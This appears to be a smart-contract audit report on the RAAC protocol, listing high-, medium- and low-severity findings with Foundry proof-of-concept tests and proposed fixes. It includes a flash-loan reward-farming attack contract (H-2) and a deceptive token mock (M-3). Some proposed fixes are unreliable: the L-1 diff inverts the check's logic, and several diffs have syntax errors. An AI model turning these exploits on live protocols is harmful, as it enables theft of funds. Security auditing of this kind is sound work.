## [H-1] `RAACToken:_update` function is transfering the fees to the feeCollector directly instead of calling the `FeeCollector:collectFees` causing to this fees to be blocked in the `feeCollector` contract forever.
Description:
​
The `FeeCollector` contract have a function called `collectFees` that recive all the fees from the `msg.sender` and update the storage with the new fee amount, making this fees to be able to be shared and claimed. The problem is that the `RAACToken:_update` do not call this `FeeCollector:collectFees` function it transfer the tokens directly instead.
​
```solidity
​
    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        ...
@>      super._update(from, feeCollector, totalTax - burnAmount);
        super._update(from, address(0), burnAmount);
        super._update(from, to, amount - totalTax);
    }
```
​
Impact:
​
These tokens tranfered will be blocked in the `feeCollector` contract forever
​
Proof of Concept:
​
**Here are the steps to run the Foundry PoC:**
​
1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` forlder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_feesAreWastedBecauseIsTransferingDirectly -vvvv`
​
​
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test,console2} from "lib/forge-std/src/Test.sol";
import {DebtToken} from "contracts/core/tokens/DebtToken.sol";
import {RAACToken} from "contracts/core/tokens/RAACToken.sol";
import {DEToken} from "contracts/core/tokens/DEToken.sol";
import {RToken} from "contracts/core/tokens/RToken.sol";
import {veRAACToken} from "contracts/core/tokens/veRAACToken.sol";
import {FeeCollector, IFeeCollector} from "contracts/core/collectors/FeeCollector.sol";
import {Treasury} from "contracts/core/collectors/Treasury.sol";
​
contract StabilityPoolPoc is Test {
    RAACToken raacToken;
    FeeCollector  feeCollector;
    veRAACToken veRaacToken;
    Treasury treasury;
​
    address admin = makeAddr("admin");
    address initialOwner = makeAddr("initialOwner");
    address repairFund = makeAddr("repairFund");
    address minter = makeAddr("minter");
    address reciver = makeAddr("reciver");
    address user = makeAddr("user");
​
    function setUp() external {
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 10 days); 
​
        vm.startPrank(initialOwner);
        treasury = new Treasury(admin);
        raacToken = new RAACToken(initialOwner, 0, 0);
        veRaacToken = new veRAACToken(address(raacToken));
        feeCollector = new FeeCollector(address(raacToken), address(veRaacToken), address(treasury), repairFund, admin);
        raacToken.setMinter(minter);
        raacToken.setFeeCollector(address(feeCollector));
        vm.stopPrank();
    }
​
    function test_feesAreWastedBecauseIsTransferingDirectly() external {
        uint256 mintAmountWithoutFees = 10e18;
        uint256 expectedFees = 150000000000000000;
        vm.prank(minter);
        raacToken.mint(reciver,mintAmountWithoutFees);
​
        vm.prank(reciver);
        raacToken.transfer(user, 10e18);
        IFeeCollector.CollectedFees memory collectedFees = feeCollector.getCollectedFees();
        uint256 totalAccumulatedFees = collectedFees.protocolFees + collectedFees.lendingFees + collectedFees.performanceFees + collectedFees.insuranceFees + collectedFees.mintRedeemFees + collectedFees.vaultFees + collectedFees.swapTaxes + collectedFees.nftRoyalties;
        assert(raacToken.balanceOf(user) < 10e18); // check that fees were applied
        assertEq(raacToken.balanceOf(user) + expectedFees, 10e18);
        assert(totalAccumulatedFees != expectedFees);
        assertEq(totalAccumulatedFees, 0); // check that the fee collector didn't stored the fees
    }
}
```

​
Recommended Mitigation:
​
1. Call the `FeeCollector:collectRewards` instead of transfer it directly. (recommended)
​
```diff
​
    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        ...
-       super._update(from, feeCollector, totalTax - burnAmount);
+       FeeCollector(feeColletor).collectFees(totalTax - burnAmount, feeType);
        super._update(from, address(0), burnAmount);
        super._update(from, to, amount - totalTax);
    }
```
​
2. Add a way to withdraw fees from the `FeeCollector`. (not recommended)

## [H-2] Flash Loan Exploit - Risk-Free RAAC Farming

Description:
​
The `StabilityPool:withdraw` function does not enforce a minimum lock-up period between deposit and withdrawal And  flawed formula calculating rewards, allows a user to exploit the system using a `crvUSD flash loan` from the Curve `FlashLender contract` as follows:
​
1. Take a `crvUSD` flash loan.
2. `Deposit` the borrowed crvUSD in the `LendingPool` via `LendingPool:deposit`, receiving `rTokens`.
3. Deposit the `rTokens` into the StabilityPool, receiving `deTokens`.
4. Withdraw the `rTokens` immediately from the `StabilityPool` using `StabilityPool:withdraw`, burning `deTokens` and claiming RAAC rewards.
5. Withdraw the `crvUSD` from the LendingPool, burning the `rTokens`.
6. `Repay` the flash loan using the `crvUSD` received and paying `fees`.
​
This sequence allows an attacker to earn RAAC rewards instantly, without any initial investment or risk.
​
Impact:
​
An attacker can immediately harvest RAAC rewards whit minimal initial investment (to pay flashLoan fees) and without incurring any financial risk.
​
Proof of Concept:
​
​
**Here are the steps to run the Foundry PoC:**
​
1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` folder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_canGetRaacTokenWithoutAnyInversionAndTimeWait -vvvv`
​
```solidity
​
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test,console2} from "lib/forge-std/src/Test.sol";
import {DebtToken} from "contracts/core/tokens/DebtToken.sol";
import {LendingPool} from "contracts/core/pools/LendingPool/LendingPool.sol";
import {StabilityPool} from "contracts/core/pools/StabilityPool/StabilityPool.sol";
import {RAACMinter} from "contracts/core/minters/RAACMinter/RAACMinter.sol";
import {RAACToken} from "contracts/core/tokens/RAACToken.sol";
import {DEToken} from "contracts/core/tokens/DEToken.sol";
import {RToken} from "contracts/core/tokens/RToken.sol";
import {RAACNFT} from "contracts/core/tokens/RAACNFT.sol"; 
import {RAACHousePrices} from "contracts/core/primitives/RAACHousePrices.sol";
import {ERC20Mock, ERC20} from "contracts/mocks/core/tokens/ERC20Mock.sol";
​
contract StabilityPoolPoc is Test {
    StabilityPool stabilityPool;
    RAACMinter raacMinter;
    RAACToken raacToken;
    ERC20Mock crvUsdMock;
    RToken rToken;
    RAACHousePrices housePrices;
    RAACNFT raacNft;
    LendingPool reservePool;
    DebtToken debtToken;
    DEToken deToken;
    CrvUSDFlashLoanMock flashLoaner;
​
    address initialOwner = makeAddr("initalOwner");
    address reciver = makeAddr("reciver");
    address attacker = makeAddr("attacker");
​
    function setUp() external {
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 10 days); 
​
​
            crvUsdMock = new ERC20Mock("crv", "crv");
            housePrices = new RAACHousePrices(initialOwner);
            raacNft = new RAACNFT(address(crvUsdMock), address(housePrices), initialOwner);
            debtToken = new DebtToken("DebtToken", "DT", initialOwner);
            rToken = new RToken("RToken", "RT", initialOwner, address(crvUsdMock));
            reservePool = new LendingPool(address(crvUsdMock), address(rToken), address(debtToken), address(raacNft), address(housePrices), 1);
​
​
​
        stabilityPool = new StabilityPool(initialOwner);
        raacToken = new RAACToken(initialOwner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(reservePool), initialOwner);
        deToken = new DEToken("DEToken", "DET", initialOwner, address(rToken));
​
        flashLoaner = new CrvUSDFlashLoanMock(address(crvUsdMock), address(this), attacker);
​
        vm.startPrank(initialOwner);
        raacToken.setMinter(address(raacMinter));
        raacMinter.setStabilityPool(address(stabilityPool));
        rToken.setReservePool(address(reservePool));
        stabilityPool.initialize(address(rToken),address(deToken), address(raacToken), address(raacMinter), address(crvUsdMock), address(reservePool));
        deToken.setStabilityPool(address(stabilityPool));
        vm.stopPrank();
    }
​
    function test_canGetRaacTokenWithoutAnyInversionAndTimeWait() external {
        deal(address(raacToken),address(stabilityPool) ,50e18);
        deal(address(deToken),address(stabilityPool) ,50e18);
        deal(address(crvUsdMock), attacker, 1e16); //Initial balance of the attacker, simulating fees
        //Simulate the flashLoan
        assertEq(raacToken.balanceOf(attacker), 0);
        assertEq(crvUsdMock.balanceOf(attacker), 1e16);
​
        flashLoaner.getAFlashLoan();
​
        assert(raacToken.balanceOf(attacker) > 0);
        assertEq(crvUsdMock.balanceOf(attacker), 0);
        console2.log("earnings: ",raacToken.balanceOf(attacker));
    }
​
    function attack() external {
        vm.startPrank(attacker);
            crvUsdMock.approve(address(reservePool), 10e18);
            reservePool.deposit(10e18);
        vm.stopPrank();
​
​
        vm.startPrank(attacker);
            rToken.approve(address(stabilityPool), 10e18);
            stabilityPool.deposit(10e18);
        vm.stopPrank();
​
​
        vm.prank(attacker);
        stabilityPool.withdraw(10e18);
​
        vm.startPrank(attacker);
        reservePool.withdraw(10e18);
        vm.stopPrank();
​
        console2.log("Raac balance ", raacToken.balanceOf(attacker));
        console2.log("crvUsdMock balance ", crvUsdMock.balanceOf(attacker));
​
        vm.prank(attacker);
        crvUsdMock.transfer(address(flashLoaner), 10e18 + 1e16);
    }
​
}
​
contract CrvUSDFlashLoanMock {
    ERC20Mock crvUsd;
    StabilityPoolPoc executor;
    address flashLoanReciver;
    uint256 fees = 1e16;
​
    constructor (address _crvUsd, address _executor, address _flashLoanReciver) {
        crvUsd = ERC20Mock(_crvUsd);
        crvUsd.mint(address(this), 10e18);
        executor = StabilityPoolPoc(_executor);
        flashLoanReciver = _flashLoanReciver;
    }
​
    function getAFlashLoan() external {
        crvUsd.transfer(flashLoanReciver, 10e18);
​
        executor.attack();
​
        require(crvUsd.balanceOf(address(this)) == 10e18 + 1e16, "Flashloan didn't repaied");
​
    }
}
```
​
​
​
Recommended Mitigation:
​
Introduce a delay between the user's deposit and the moment they are allowed to withdraw. This measure helps prevent potential exploitation by ensuring that funds remain locked for a predefined period before becoming accessible.

## [M-1] `RAACMinter:setFeeCollector` reverts if the fee collector is `address(0)`, while `RAACToken` specifies that __no fees are charged__ if the fee collector is `address(0)`.

Description:
​
The `RAACMinter:setFeeCollector` function sets the `feeCollector`, which is the address that receives the fees. The `RAACToken:_update` function charges a fee to the sender on each transaction. However, this function specifies that if feeCollector is `address(0)`, __no fees are applied__.
​
Here is the check preventing `feeCollector` to be `address(0)`:
```solidity
    function setFeeCollector(address _feeCollector) external onlyRole(UPDATER_ROLE) {
@>      if (_feeCollector == address(0)) revert FeeCollectorCannotBeZeroAddress();
        raacToken.setFeeCollector(_feeCollector);
        emit ParameterUpdated("feeCollector", uint256(uint160(_feeCollector)));
    }
```
​
And here is the line in the `RAACToken` contract stating that if `feeCollector` is `address(0)`, no fees will be charged:
​
```solidity
function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        ...
@>      if (baseTax == 0 || from == address(0) || to == address(0) || whitelistAddress[from] || whitelistAddress[to] || feeCollector == address(0)) {
            super._update(from, to, amount);
            return;
        }
        ...
    }
```
​
Impact:
​
Since the `feeCollector` cannot be set to `address(0)`, the contract will always __charge fees on transactions__ even if `feeCollector` is `address(0)`.
​
Recommended Mitigation:
​
- Modify the `RAACMinter:setFeeCollector` function to allow setting the `feeCollector` to `address(0)`. This would enable the contract to operate without charging fees when desired.
- Revent in `RAACToken:_update` if `feeCollector` is `address(0)` 

## [M-2] Since the function `RaacMinter:tick` add excessTokens but this tokens are minted to the `stabilityPool`, If excess tokens are not zero, `RaacMinter:mintRewards` function will always revert with `ERC20 Insufficient Balance`

Description:
​
The function `RaacMinter:tick` increments the excessTokens count. This tokens will be discounted from the total to mint in the `RaacMinter:mintRewards` and transfered to the reciver. The proble is that the funcion `tick` do not mint the tokens in the `RaacMinter`, it's minting it in the `StabilityPool` and they are never transfered to the `RaacMinter`. 
​
Impact:
​
If there are excees Tokens, the function `RaacMinter:mintRewards` will always revert with `ERC20 Insufficient Balance`, because tokens are owner by the `StabilityPool`.
​
Proof of Concept:
​
**Here are the steps to run the Foundry PoC:**

1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` forlder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_exessTokenBalanceIsAlwaysZeroAndUserWontReciveThem -vvvv`

​
    Just for the sake of simplifying the test, I paste this function in the RaacMinter, which is doing exactly the same thing as the tick function by minting tokens and adding excess tokens. 
​
    ```solidity
        function getSomeExessBalance(uint256 amountToMint) external {
            excessTokens += amountToMint;
            lastUpdateBlock = block.number;
            raacToken.mint(address(stabilityPool), amountToMint);
        }
    ```
​
    add this function to the end of the contract.

​
​
```solidity
​
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test,console2} from "lib/forge-std/src/Test.sol";
import {DebtToken} from "contracts/core/tokens/DebtToken.sol";
import {LendingPool} from "contracts/core/pools/LendingPool/LendingPool.sol";
import {StabilityPool} from "contracts/core/pools/StabilityPool/StabilityPool.sol";
import {RAACMinter} from "contracts/core/minters/RAACMinter/RAACMinter.sol";
import {RAACToken} from "contracts/core/tokens/RAACToken.sol";
import {RToken} from "contracts/core/tokens/RToken.sol";
import {RAACNFT} from "contracts/core/tokens/RAACNFT.sol"; 
import {RAACHousePrices} from "contracts/core/primitives/RAACHousePrices.sol";
import {ERC20Mock, ERC20} from "contracts/mocks/core/tokens/ERC20Mock.sol";
​
contract RAACMinterPoC is Test {
    StabilityPool stabilityPool;
    RAACMinter raacMinter;
    RAACToken raacToken;
    ERC20Mock crvUsdMock;
    RToken rToken;
    RAACHousePrices housePrices;
    RAACNFT raacNft;
    LendingPool reservePool;
    DebtToken debtToken;
​
    address initialOwner = makeAddr("initalOwner");
    address reciver = makeAddr("reciver");
​
    function setUp() external {
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 10 days); 
​
​
            crvUsdMock = new ERC20Mock("crv", "crv");
            housePrices = new RAACHousePrices(initialOwner);
            raacNft = new RAACNFT(address(crvUsdMock), address(housePrices), initialOwner);
            debtToken = new DebtToken("DebtToken", "DT", initialOwner);
            rToken = new RToken("RToken", "RT", initialOwner, address(crvUsdMock));
            reservePool = new LendingPool(address(crvUsdMock), address(rToken), address(debtToken), address(raacNft), address(housePrices), 1);
​
​
​
        stabilityPool = new StabilityPool(initialOwner);
        raacToken = new RAACToken(initialOwner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(reservePool), initialOwner);
​
        vm.startPrank(initialOwner);
        raacToken.setMinter(address(raacMinter));
        raacMinter.setStabilityPool(address(stabilityPool));
        vm.stopPrank();
    }
​
    function test_exessTokenBalanceIsAlwaysZeroAndUserWontReciveThem() external {
        vm.roll(block.number + 10);
        vm.warp(block.timestamp + 1 days); 
        raacMinter.getSomeExessBalance(1e18);
        assert(raacMinter.getExcessTokens() > 0);
​
        vm.prank(address(stabilityPool));
        vm.expectRevert();
        raacMinter.mintRewards(reciver, 10e18);
    }
}
```

​
Recommended Mitigation:
​
1. Delete the excess tokens functionality and mint always the amount to mint.
2. Mint the tokens to the RAACMinter and update StabilityPool logic.
3. Make some mintRewards function in the stability pool where call this funcion and approve the excess balance.

## [M-3] Since `Treasury:deposit` function accept any erc20 token, a malicious user can deposit a weird erc20 that return zero instead of revert. Modifying internal accounting but does not receive the tokens

Description:
​
The function `Treasury:deposit` do not check if the tokens have been recived for the contract, a malicious user can transfer a weird erc20 that returns 0 instead of revert, and forcing this transfer to fail. The `Treasury` contract will not realize that it reversed and did not receive the tokens and will add the value to the totalAmount and the token mappig, without actually having received the tokens. 
​
Impact:
​
The contract will modify the state variables that stores the totalAmount of the contract and of the specific token, but the contract won't have this tokens. Storing a wrong value in the state variables.
​
Proof of Concept:

​
​
**Here are the steps to run the Foundry PoC:**
​
1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` forlder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_weirdErc20CanAffectContractInternalAccounting -vvvv`
​
​
- To be able to run this PoC, create a new folder in the `test/ProofOfCodes` called `mocks` and create a file called `BasicWeirdERC20.sol` and paste the following code:
​
```solidity
    // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
​
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
​
contract BasicWeirdERC20 is ERC20 {
    mapping(address => mapping(address => uint256)) private _allowances;
​
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
    }
​
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance < amount || balanceOf(sender) < amount) {
            return false; // En lugar de revertir, simplemente retorna false
        }
​
        _allowances[sender][_msgSender()] = currentAllowance - amount;
        _transfer(sender, recipient, amount);
        return true;
    }
​
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }
​
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
}
​
```

​
```solidity
​
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "lib/forge-std/src/Test.sol";
import {Treasury} from "contracts/core/collectors/Treasury.sol";
import {ERC20Mock} from "contracts/mocks/core/tokens/ERC20Mock.sol";
import {BasicWeirdERC20} from "./mocks/BasicWeirdERC20.sol";
​
contract WeridErc20Risk is Test {
    Treasury treasury;
​
    address public admin = makeAddr("admin");
    address public attacker = makeAddr("attacker");
    BasicWeirdERC20 weirdToken;
​
    function setUp() external {
        treasury = new Treasury(admin);
        weirdToken = new BasicWeirdERC20("Weird Token", "WT");
    }
​
    function test_weirdErc20CanAffectContractInternalAccounting() external {
        assertEq(weirdToken.balanceOf(address(attacker)), 0);
​
        vm.startPrank(attacker);
        treasury.deposit(address(weirdToken), type(uint256).max);
        vm.stopPrank();
​
        assertEq(weirdToken.balanceOf(address(treasury)), 0);
        assertEq(treasury.getTotalValue(), type(uint256).max);
        assertEq(treasury.getBalance(address(weirdToken)), type(uint256).max);
​
    }
}
```

​
Recommended Mitigation:
​
- Add a valitation that checks if the contract have recived the transfered amount.
​
```diff
    function deposit(address token, uint256 amount) external override nonReentrant {
        if (token == address(0)) revert InvalidAddress();
        if (amount == 0) revert InvalidAmount();
+       uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(msg.sender, address(this), amount); 
+       uint256 balanceAfter = IERC20(token).balanceOf(address(this));
+       if(balanceAfter - amount !=  balanceBefore) {revert TransferFailed()}
        _balances[token] += amount;
        _totalValue += amount;
        
        emit Deposited(token, amount);
    }
```
​
- Instead of doing transfer from perfom safeTransferFrom. (recommended)

## [L-1] The `TimelockController:scheduleBatch` function lets users schedule operations even if their predecessor is unexecuted, contradicting the docs, which state that an operation can't be created until its predecessor is executed.

Description: 
​
```solidity
@>   if (!isOperationDone(predecessor) && !isOperationPending(predecessor)) {
        revert PredecessorNotExecuted(predecessor);
    }
```
​
This check, is trying to prevent to create an operation if the predecesor have not been executed, but this check is wrong because is saying that if the operation is not done  and if it's not pending revert, but if the operation is not done means that it's pending and if the operation is not pending means that's done.
​
Impact:
​
Will be posible to create a new operation even if the predecesor is not done, while there is a check trying to prevent that behaviour.
​
Proof of Concept:
​
1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` forlder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_canCreateAOperationAlsoIfPredecesorIsNotDone -vvvv`
​
```solidity
    // SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "lib/forge-std/src/Test.sol";
import {TimelockController} from "contracts/core/governance/proposals/TimelockController.sol";
​
contract TimelockControllerPoC is Test {
    TimelockController timelockController;
    address admin = makeAddr("admin");
    address superUser = makeAddr("superUser");
    address user = makeAddr("user");
    uint256 constant INITIAL_TIMELOCK_DELAY = 4 days;
    bytes32 zeroBytes = bytes32(0);
    bytes32 randomNumber = bytes32("323");
    bytes32 randomNumber1 = bytes32("232");
​
    address[] targets;
    uint256[] values;
    bytes[] calldatas;
    address[] proposers;
    address[] executors;
    function setUp() external {
​
        proposers.push(superUser);
        executors.push(superUser);
​
        timelockController = new TimelockController(INITIAL_TIMELOCK_DELAY, proposers, executors, admin);
    }
​
    function test_canCreateAOperationAlsoIfPredecesorIsNotDone() external {
        targets.push(user);
        values.push(10);
        calldatas.push("");
        vm.startPrank(superUser);
        bytes32 predecesorId = timelockController.scheduleBatch(targets, values, calldatas, zeroBytes, randomNumber, 5 days);
        assertEq(timelockController.isOperationDone(predecesorId), false);
        timelockController.scheduleBatch(targets, values, calldatas,predecesorId, randomNumber1, 5 days);
        bytes32 actualId = timelockController.hashOperationBatch(targets, values, calldatas,predecesorId, randomNumber1);
        vm.stopPrank();
        assertEq(timelockController.isOperationDone(predecesorId), false);
        assertEq(timelockController.isOperationDone(actualId), false);
​
    }
}
```
​

​
Recommended Mitigation:
​
- Modify the check, instead of saying `&&` it should say `||` and the second part
should say `isOperationPending(predecessor)` instead of `!isOperationPending(predecessor)`.
​
```diff
-   if (!isOperationDone(predecessor) && !isOperationPending(predecessor)) {
+   if (!isOperationDone(predecessor) && isOperationPending(predecessor)) {
        revert PredecessorNotExecuted(predecessor);
    }
```

## [L-2] The `veRAACToken:lock` function do not stores the lock data in the locks mapping.

Description:
​
The `veRAACToken:lock` function, locks RAAC tokens for a specified duration and mints veRAAC tokens representing voting power. The `LockManager:createLock` stores in `LockManager:locks` mapping, the lock data. But the `veRAACToken` have another `locks` mapping, and the `veRAACToken:lock` do not stores the lock data in this mapping.
​
The functions `veRAACToken:getLockedBalance` and `veRAACToken:getLockEndTime` return the data from the `veRAACToken:locks` mapping.
​
Impact:
​
Since the functions `veRAACToken:getLockedBalance` and `veRAACToken:getLockEndTime` get the data to return from the `veRAACToken:locks` mapping, that is empty, and not from the `LockManager:locks` that is where data is stored, this functions will always return 0.
​
Proof of Concept:

​
**Here are the steps to run the Foundry PoC:**
​
1. Open the `linux terminal`, `wsl` in windows. 
​
​
2. `nomicfoundation` installation:
    - If you have `npm` installed run this command:
        - `npm install --save-dev @nomicfoundation/hardhat-foundry`
    - If you have `yarn` installed run this command:
        - `yarn add --dev @nomicfoundation/hardhat-foundry`
    - If you have `pnpm` installed run this command: 
        - `pnpm add --save-dev @nomicfoundation/hardhat-foundry`
​
3. open the `hardhat.config.cjs`
    - Paste this at the begining of the code:
        - `require("@nomicfoundation/hardhat-foundry");`
​
4. run `npx hardhat init-foundry` 
    - This task will create a `foundry.toml` file with the right configuration and install `forge-std`
​
5. In the `test/` forlder create a new folder called `ProofOfCodes`
​
6. In this `test/ProofOfCodes` folder create a new file and paste the following code
​
7. To run the test you should run `forge test --mt test_lockFunctionDontStoresTheLockDataInTheStorageMapping -vvvv`
​
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test,console2} from "lib/forge-std/src/Test.sol";
import {veRAACToken, IveRAACToken} from "contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "contracts/core/tokens/RAACToken.sol";
import {ERC20Mock, ERC20} from "contracts/mocks/core/tokens/ERC20Mock.sol";
​
contract RAACMinterPoC is Test {
​
    RAACToken raacToken;
    veRAACToken veRaac;
​
    address user = makeAddr("user");
    address initialOwner = makeAddr("initialOwner");
    
    event LockCreated(address indexed user, uint256 amount, uint256 unlockTime);
    function setUp() external {
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 10 days); 
​
​
        raacToken = new RAACToken(initialOwner, 0, 0);
        veRaac = new veRAACToken(address(raacToken));
        deal(address(raacToken), user, 10e18);
    }
​
    function test_lockFunctionDontStoresTheLockDataInTheStorageMapping() external {
        vm.startPrank(user);
        raacToken.approve(address(veRaac), 10e18);
        vm.expectEmit();
        emit LockCreated(user, 10e18, block.timestamp + 1460 days);
        veRaac.lock(10e18, 1460 days);
        vm.stopPrank();
​
        assertEq(veRaac.getLockedBalance(user), 0);
        assertEq(veRaac.getLockEndTime(user), 0);
    }
​
}
```
​
​
Recommended Mitigation:
​
The functions `veRAACToken:getLockedBalance` and `veRAACToken:getLockEndTime` should get the value from the `LockManager:locks` mapping not from the `veRAACToken:locks`.
​
```diff
    function getLockedBalance(address account) external view returns (uint256) {
-        return locks[account].amount;
+        return _lockState.locks[account].amount:
    }
​
    function getLockEndTime(address account) external view returns (uint256) {
-        return locks[account].end;
+        return _lockState.locks[account].end:
    }
```

## [L-3] `BaseGauge:constructor` sets the min most in a bigger value than the maximum boost

`BaseGauge:constructor` sets the min most in a bigger value than the maximum boost

Description:

The `Constructor` of the base gauge is initializing the minBost bigger than the maximum boost

        boostState.maxBoost = 25000; // 2.5x
        boostState.minBoost = 1e18;
